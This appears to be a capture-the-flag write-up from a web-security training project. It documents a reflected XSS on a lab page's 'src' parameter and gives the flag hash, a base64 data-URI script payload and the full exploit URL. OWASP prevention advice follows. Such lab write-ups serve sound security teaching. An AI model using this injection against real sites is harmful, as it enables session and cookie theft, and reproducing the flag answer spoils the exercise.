# XSS MEDIAS REQUEST

## Flag
```
928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```

## Discovery
On the page http://{IP_ADDRESS}/

The NSA image (the one with headphone) leads to http://{IP_ADDRESS}/?page=media&src=nsa \
You can change nsa to base64 script
```diff
"data:text/html;base64," + base64("<script>alert("wtf");</script>")
> data:text/html;base64,PHNjcmlwdD5hbGVydCgid3RmIik7PC9zY3JpcHQ+
```
Finaly go to : \
http://{IP_ADDRESS}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgid3RmIik7PC9zY3JpcHQ+ \
**This work because the request response accept text/html**

## Use
> the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site

## Prevention
> - Never Insert Untrusted Data Except in Allowed Locations
> - HTML Escape Before Inserting Untrusted Data into HTML Element Content
> - Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes
> - JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values
> - CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values
> - URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values
> - Sanitize HTML Markup with a Library Designed for the Job
> - Avoid JavaScript URL's

## Documentation
- [owasp - XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
- [owasp - prevent XSS breaches](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [base64](https://www.base64decode.org/)

---

[RETURN](https://github.com/tillderoquefeuil/darkly)